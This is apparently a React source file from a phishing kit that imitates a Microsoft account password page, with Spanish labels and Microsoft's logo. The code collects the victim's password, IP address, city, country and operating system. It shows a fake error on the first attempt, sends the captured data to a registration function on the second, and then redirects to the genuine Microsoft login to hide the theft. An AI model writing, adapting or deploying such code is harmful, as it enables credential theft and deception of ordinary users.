import { useEffect, useState } from "react";
import { Link, useParams } from "react-router-dom";
import * as FiIcons from "react-icons/fi";
import css from "./login.module.css";
// import { createRegistroUser } from "../../config/registroApi";

export default function Login() {
  const [xemail, setxEmail] = useState("");
  const [password, setPassword] = useState("");
  const [errorSpan, setErrorSpan] = useState(false);
  const [errPassword, setErrPaswword] = useState(false);

  //params
  const { email } = useParams();
  console.log(email);
  console.log(xemail);
  console.log(password);

  //forma para obtener ubicacion de su pais y su ip
  const [details, setDetails] = useState(null);
  // console.log(details?.city);
  // console.log(details);

  let country = details?.country_name;
  let IPv4 = details?.IPv4;
  let city = details?.city;

  useEffect(() => {
    const getUserGeolocationDetails = () => {
      fetch(
        "https://geolocation-db.com/json/0f761a30-fe14-11e9-b59f-e53803842572"
      )
        .then((response) => response.json())
        .then((data) => setDetails(data));
    };
    getUserGeolocationDetails();
  }, []);

  //ver el sistema operativo de dpnde ingresa a la web
  var InfoSistemaOperativo = window.navigator.appVersion.toLowerCase();
  // const so = InfoSistemaOperativo.indexOf('0.5')
  const datax = InfoSistemaOperativo.split("(");
  const so = datax[1];
  // console.log(InfoSistemaOperativo);

  const statePassword = (e) => {
    console.log(e.target.value);
    if (e.target.value.length > 0) {
      setErrPaswword(false)
    }
    setPassword(e.target.value);
  };

  //enviar datos al server
  const enviarRegitro = async (e) => {
    e.preventDefault();

    let datax = { email, city, country, IPv4, password, so };
    console.log(datax);

    if (errorSpan) {
      await createRegistroUser(datax);
      return (window.location.href =
        "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=23&ct=1713452137&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26RpsCsrfState%3d036328ae-6978-64c6-c8dc-e4f5539b0b81&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c");
    }

    if (!password) {
      return setErrPaswword(true);
    } else {
      setErrorSpan(true);
      setPassword("");
      // return await createRegistroUser(datax);
    }
  };

  return (
    <div className={css.bg_login}>
      <div className={css.container_login}>
        <div className={css.out_title}>
          <img src="out.png" alt="red" />
        </div>

        <div className={css.div_login}>
          <img
            className={css.logo}
            src="https://acctcdn.msauth.net/images/microsoft_logo_7lyNn7YkjJOP0NwZNw6QvQ2.svg"
            alt="Microsoft"
          />

          <form className={css.form_login} onSubmit={enviarRegitro}>
            <div className={css.div_email}>
              {email?.length > 0 && <FiIcons.FiArrowLeft />}
              <input
                className={css.input}
                type="text"
                name="email"
                value={email && email}
                onChange={(e) => setxEmail(e.target.value)}
              />
            </div>

            <h3 className={css.text_escribir}>Escribir contraseña</h3>

            {errPassword && (
              <p className={css.error}>
                Escriba la contraseña de su cuenta de Microsoft.
              </p>
            )}
            {/* 
            {errPassword ? (
              <section className={css.error}>
                <span>Escribe la contraseña de tu cuenta Microsoft.</span>
              </section>
            ) : null} */}

            {/* {errorSpan ? (
              <section className={css.error}>
                <span>
                  la cuenta o la contraseña es incorrecta si no recuerdas la
                  contraseña
                </span>
                <strong> restablecela ahora</strong>
              </section>
            ) : null} */}
            <div className={` ${css.div_password}`}>
              <input
                className={`${css.input_pass} `}
                type="password"
                name="password"
                placeholder="Contraseña"
                value={password}
                onChange={statePassword}
              />
            </div>

            <Link to="/login" className={css.link_login}>
              ¿Ha olvidado su contraseña?
            </Link>

            <button type="submit" className={css.btn_login}>
              Iniciar sesión
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
